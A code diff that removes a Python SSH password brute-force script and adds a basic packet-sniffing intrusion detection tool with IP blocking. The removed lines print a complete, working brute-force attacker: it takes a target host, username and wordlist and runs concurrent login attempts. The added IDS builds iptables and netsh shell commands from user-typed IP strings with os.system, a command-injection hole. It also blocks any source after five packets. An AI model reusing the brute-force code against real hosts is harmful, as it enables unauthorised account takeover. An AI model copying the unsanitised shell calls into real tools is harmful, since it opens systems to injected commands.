@@ -1,101 +1,133 @@
-import asyncio
-import asyncssh
-import argparse
-from termcolor import colored
-from datetime import datetime
-from os import path
-from sys import exit
+import os
+import platform
+import threading
+import time
+from scapy.all import sniff, IP
 
+# IDS Configuration
+alert_threshold = 5  # Number of packets before flagging as suspicious
+ip_count = {}
+blocked_ips = set()
+log_file = "blocked_ips.log"
+sniffing = False
+sniff_thread = None
 
-def get_args():
-    """ Function to get command-line arguments """
-    parser = argparse.ArgumentParser()
-    parser.add_argument('target', help='Host to attack on e.g. 10.10.10.10.')
-    parser.add_argument('-p', '--port', dest='port', default=22,
-                        type=int, required=False, help="Port to attack on, Default: 22")
-    parser.add_argument('-w', '--wordlist', dest='wordlist',
-                        required=True, type=str, help="Path to the password wordlist")
-    parser.add_argument('-u', '--username', dest='username',
-                        required=True, help="Username for bruteforce attack")
-    arguments = parser.parse_args()
-    return arguments
+# Function to log blocked IPs
+def log_blocked_ip(ip):
+    with open(log_file, "a") as file:
+        file.write(ip + "\n")
 
+# Function to block an IP
+def block_ip(ip):
+    if ip in blocked_ips:
+        print(f"⚠ IP {ip} is already blocked!")
+        return  
 
-async def ssh_bruteforce(hostname, username, password, port, found_flag):
-    """Attempts SSH login with given credentials"""
-    if found_flag.is_set():
-        return  # Stop further attempts if the password is found
+    system = platform.system()
+    if system == "Linux":
+        os.system(f"sudo iptables -A INPUT -s {ip} -j DROP")
+    elif system == "Windows":
+        os.system(f"netsh advfirewall firewall add rule name=\"Block {ip}\" dir=in action=block remoteip={ip}")
+    
+    blocked_ips.add(ip)
+    log_blocked_ip(ip)
+    log_alert(f"🚫 IP {ip} has been blocked!")
 
-    try:
-        async with asyncssh.connect(hostname, username=username, password=password) as conn:
-            found_flag.set()
-            print(colored(
-                f"[SUCCESS] [{port}] [SSH] Host: {hostname} | Username: {username} | Password: {password}", 'green'))
-            return  # Stop further attempts once the correct password is found
+# Function to unblock an IP
+def unblock_ip(ip):
+    if ip in blocked_ips:
+        system = platform.system()
+        if system == "Linux":
+            while True:  
+                result = os.system(f"sudo iptables -D INPUT -s {ip} -j DROP")
+                if result != 0:  
+                    break
+        elif system == "Windows":
+            os.system(f"netsh advfirewall firewall delete rule name=\"Block {ip}\" remoteip={ip}")
 
-    except asyncssh.PermissionDenied:  # Corrected exception for authentication failures
-        print(colored(
-            f"[FAILED] Target: {hostname} | Username: {username} | Password: {password}", "red"))
-    except Exception as err:
-        print(f"[ERROR] {err}")
+        blocked_ips.remove(ip)
+        log_alert(f"✅ IP {ip} has been unblocked!")
+    else:
+        log_alert(f"❌ IP {ip} not found in blocked list.")
 
-
-async def main(hostname, port, username, wordlist):
-    """Main function to manage SSH brute-force attempts"""
-    tasks = []
-    found_flag = asyncio.Event()  # Flag to stop when password is found
-    concurrency_limit = 10  # Maximum concurrent tasks
-    counter = 0
-
-    try:
-        with open(wordlist, 'r', encoding="latin-1") as f:
-            passwords = [line.strip() for line in f.readlines()]
-
-    except Exception as e:
-        print(colored(f"[-] Error reading wordlist: {e}", "red"))
+# Function to detect attacks
+def packet_callback(packet):
+    if not sniffing:
         return
 
-    for password in passwords:
-        if found_flag.is_set():  # Stop if a valid password is found
+    if packet.haslayer(IP):
+        src_ip = packet[IP].src
+        ip_count[src_ip] = ip_count.get(src_ip, 0) + 1
+
+        if ip_count[src_ip] > alert_threshold:
+            log_alert(f"⚠ Suspicious activity detected from {src_ip}")
+            block_ip(src_ip)
+
+# Function to log alerts in CLI format
+def log_alert(message):
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+    print(f"[{timestamp}] {message}")
+
+# Function to start IDS
+def start_sniffing():
+    global sniffing, sniff_thread
+    if sniffing:
+        log_alert("⚠ IDS is already running!")
+        return
+    
+    sniffing = True
+    sniff_thread = threading.Thread(target=sniff, kwargs={"prn": packet_callback, "store": 0, "iface": None, "filter": "ip"}, daemon=True)
+    sniff_thread.start()
+    log_alert("🔍 IDS Started (Listening on ALL interfaces)")
+
+# Function to stop IDS
+def stop_sniffing():
+    global sniffing
+    if not sniffing:
+        log_alert("⚠ IDS is not running!")
+        return
+    
+    sniffing = False
+    log_alert("⛔ IDS Stopped!")
+
+# CLI Menu
+def menu():
+    while True:
+        print("\n" + "="*50)
+        print("🔹 Intrusion Detection System (IDS) 🔹")
+        print("="*50)
+        print("[1] Start IDS")
+        print("[2] Stop IDS")
+        print("[3] Block an IP")
+        print("[4] Unblock an IP")
+        print("[5] Show Blocked IPs")
+        print("[6] Exit")
+        choice = input("Enter your choice: ")
+
+        if choice == "1":
+            start_sniffing()
+        elif choice == "2":
+            stop_sniffing()
+        elif choice == "3":
+            ip = input("Enter IP to block: ")
+            block_ip(ip)
+        elif choice == "4":
+            ip = input("Enter IP to unblock: ")
+            unblock_ip(ip)
+        elif choice == "5":
+            print("\nBlocked IPs:")
+            if blocked_ips:
+                for ip in blocked_ips:
+                    print(f"- {ip}")
+            else:
+                print("No IPs are blocked.")
+        elif choice == "6":
+            stop_sniffing()
+            print("Exiting IDS... Goodbye!")
             break
+        else:
+            print("Invalid choice! Please try again.")
 
-        if counter >= concurrency_limit:
-            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
-            tasks = []
-            counter = 0
-
-        tasks.append(asyncio.create_task(ssh_bruteforce(
-            hostname, username, password, port, found_flag)))
-
-        await asyncio.sleep(0.5)
-        counter += 1
-
-    await asyncio.gather(*tasks)
-
-    if not found_flag.is_set():
-        print(colored("\n[-] Failed to find the correct password.", "red"))
-
-
+# Run CLI Menu
 if __name__ == "__main__":
-    arguments = get_args()
-
-    if not path.exists(arguments.wordlist):
-        print(colored(
-            "[-] Wordlist file not found. Please provide the correct path.", 'red'))
-        exit(1)
-
-    print("\n---------------------------------------------------------")
-    print(colored(f"[*] Target\t: ", "light_red"), arguments.target)
-    print(colored(f"[*] Username\t: ", "light_red"), arguments.username)
-    print(colored(f"[*] Port\t: ", "light_red"), arguments.port)
-    print(colored(f"[*] Wordlist\t: ", "light_red"), arguments.wordlist)
-    print(colored(f"[*] Protocol\t: ", "light_red"), "SSH")
-    print("---------------------------------------------------------\n")
-
-    print(colored(
-        f"SSH Bruteforce started at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
-    print("---------------------------------------------------------\n")
-
-    asyncio.run(main(arguments.target, arguments.port,
-                     arguments.username, arguments.wordlist))
-
+    menu()
